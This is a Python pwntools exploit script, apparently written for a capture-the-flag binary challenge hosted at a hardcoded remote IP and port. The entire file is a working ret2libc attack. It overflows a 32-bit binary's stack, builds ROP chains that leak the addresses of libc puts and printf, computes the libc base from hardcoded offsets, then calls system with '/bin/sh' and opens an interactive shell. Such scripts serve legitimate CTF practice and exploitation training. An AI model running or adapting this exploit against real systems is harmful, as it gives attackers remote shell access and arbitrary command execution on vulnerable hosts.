#!/usr/bin/env python
import pwn

REMOTE_ADDR = "206.189.123.169"
REMOTE_PORT = "5004"

# specific to my terminal - st
pwn.context.terminal = ["st", "-e", "sh", "-c"]

# helper function
addr_to_offset = lambda num: pwn.cyclic_find(num.to_bytes(4, "little"))
build_rop = lambda *items: b"".join(map(pwn.p32, items))

OFFSETS = {
    "local": {
        "puts":   0x000714c0,
        "printf": 0x00055150,
        "binsh":  0x195b84,
        "system": 0x000452a0,
        "exit":   0x000374e0,
    },
    "remote": {
        "puts":   0x00071290,
        "printf": 0x00053de0,
        "binsh":  0x18f352,
        "system": 0x00045420,
        "exit":   0x00037f80,
    },

}["remote" if pwn.args.REMOTE else "local"]


def get_challenge(elf):
    if pwn.args.REMOTE:
        chal = pwn.remote(REMOTE_ADDR, REMOTE_PORT)
    elif pwn.args.GDB:
        chal = pwn.process(elf.path)
        pwn.gdb.attach(
            chal,
            """
            b * name + 82
            c
            """,
        )
    else:
        chal = pwn.process(elf.path)
    return chal


def leak_libc_function(challenge, elf, func):
    width = addr_to_offset(0x61616169)
    padding = pwn.cyclic(width)

    ropchain = build_rop(
        elf.plt["puts"],
        elf.symbols["main"],
        elf.got[func],
    )
    exploit = padding + ropchain

    challenge.sendline(exploit)

    challenge.recvline_contains(b"Hello")
    leak = int.from_bytes(
        challenge.recvline().replace(b"\r", b""),
        "little"
    ) & 0xFFFF_FFFF

    pwn.log.info(f"Leaked libc {func} address: 0x{leak:x}")

    return leak


def call_system(challenge, elf, libc_base):
    width = addr_to_offset(0x61616169)
    padding = pwn.cyclic(width)

    ropchain = build_rop(
        libc_base + OFFSETS["system"],
        libc_base + OFFSETS["exit"],
        libc_base + OFFSETS["binsh"],
    )
    exploit = padding + ropchain

    challenge.sendline(exploit)


def solve():
    elf = pwn.ELF("./main")
    chal = get_challenge(elf)

    width = addr_to_offset(0x61616169)
    padding = pwn.cyclic(width)

    libc_puts = leak_libc_function(chal, elf, "puts")
    libc_printf = leak_libc_function(chal, elf, "printf")

    libc_base_puts = libc_puts - OFFSETS["puts"]
    libc_base_printf = libc_printf - OFFSETS["printf"]

    if libc_base_puts == libc_base_printf:
        libc_base = libc_base_puts
        pwn.log.info(f"Leaked libc base address: 0x{libc_base:x}")

        call_system(chal, elf, libc_base)

        chal.interactive()
    else:
        chal.close()
        print("Failed to exploit challenge.")


if __name__ == "__main__":
    solve()

